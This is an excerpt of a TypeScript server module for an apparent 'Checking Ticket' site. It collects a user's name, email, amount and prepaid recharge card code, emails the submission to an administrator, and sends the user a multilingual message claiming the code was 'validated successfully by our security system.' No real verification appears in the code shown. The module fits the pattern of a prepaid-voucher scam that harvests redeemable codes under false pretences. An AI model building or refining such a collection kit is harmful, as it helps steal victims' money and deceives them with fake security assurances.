...
export const recentSubmissions: TicketSubmission[] = [];

export interface EmailLocaleStrings {
  subject: (cardType: string, id: string) => string;
  title: string;
  greeting: (name: string, cardType: string) => string;
  summaryTitle: string;
...
export const USER_EMAIL_TRANSLATIONS: Record<string, EmailLocaleStrings> = {
  fr: {
    subject: (cardType, id) => `[Checking Ticket] Confirmation : Votre code ${cardType} a été validé avec succès (#${id})`,
    title: 'Validation confirmée de votre code',
    greeting: (name, cardType) => `<strong>Bonjour ${name},</strong><br/>Votre code de recharge <strong>${cardType}</strong> a été vérifié et validé avec succès par notre système de sécurité.`,
  ...
  en: {
    subject: (cardType, id) => `[Checking Ticket] Confirmation: Your ${cardType} code has been successfully validated (#${id})`,
    title: 'Confirmed validation of your code',
    greeting: (name, cardType) => `<strong>Hello ${name},</strong><br/>Your <strong>${cardType}</strong> recharge code has been verified and validated successfully by our security system.`,
  ...
  es: {
    subject: (cardType, id) => `[Checking Ticket] Confirmación: Su código ${cardType} ha sido validado con éxito (#${id})`,
    title: 'Validación confirmada de su código',
    greeting: (name, cardType) => `<strong>Hola ${name},</strong><br/>Su código de recarga <strong>${cardType}</strong> ha sido verificado y validado con éxito por nuestro sistema de seguridad.`,
  ...
  de: {
    subject: (cardType, id) => `[Checking Ticket] Bestätigung: Ihr ${cardType}-Code wurde erfolgreich validiert (#${id})`,
    title: 'Bestätigte Validierung Ihres Codes',
    greeting: (name, cardType) => `<strong>Hallo ${name},</strong><br/>Ihr <strong>${cardType}</strong>-Aufladecode wurde von unserem Sicherheitssystem erfolgreich überprüft und validiert.`,
  ...
  it: {
    subject: (cardType, id) => `[Checking Ticket] Conferma: Il tuo codice ${cardType} è stato convalidato con successo (#${id})`,
    title: 'Convalida confermata del tuo codice',
    greeting: (name, cardType) => `<strong>Ciao ${name},</strong><br/>Il tuo codice di ricarica <strong>${cardType}</strong> è stato verificato e convalidato con successo dal nostro sistema de sicurezza.`,
  ...
  pt: {
    subject: (cardType, id) => `[Checking Ticket] Confirmação: O seu código ${cardType} foi validado com sucesso (#${id})`,
    title: 'Validação confirmada do seu código',
    greeting: (name, cardType) => `<strong>Olá ${name},</strong><br/>O seu código de recarga <strong>${cardType}</strong> foi verificado e validado com sucesso pelo nosso sistema de segurança.`,
...
export function buildAdminEmailHtml(data: TicketSubmission) {
  return `
    <!DOCTYPE html>
    <html>
    <head>
...
export function buildUserConfirmationEmailHtml(data: TicketSubmission, lang = 'fr') {
...
export async function processSubmission(body: any) {
  const { name, email, amount, cardType, code, hideCode, language } = body || {};

  if (!name || typeof name !== "string" || name.trim().length < 2) {
    return { status: 400, data: { error: "Le nom est requis (minimum 2 caractères)." } };
  }

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!email || !emailRegex.test(email)) {
    return { status: 400, data: { error: "Une adresse e-mail valide est requise." } };
  }

  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) {
    return { status: 400, data: { error: "Le montant doit être un nombre valide supérieur à 0." } };
  }
  ...
  if (!cardType || !validCardTypes.includes(cardType)) {
    return { status: 400, data: { error: "Type de carte non reconnu ou non supporté." } };
  }

  if (!code || typeof code !== "string" || code.trim().length < 4) {
    return { status: 400, data: { error: "Le code est requis pour procéder à la vérification." } };
  }
  ...
  try {
    ...
    console.log("Admin notification sent:", adminInfo.messageId || "simulated");
  } catch (err) {
  ...
  try {
    ...
    console.log(`User confirmation sent (${userLang}):`, userInfo.messageId || "simulated");
  } catch (err) {
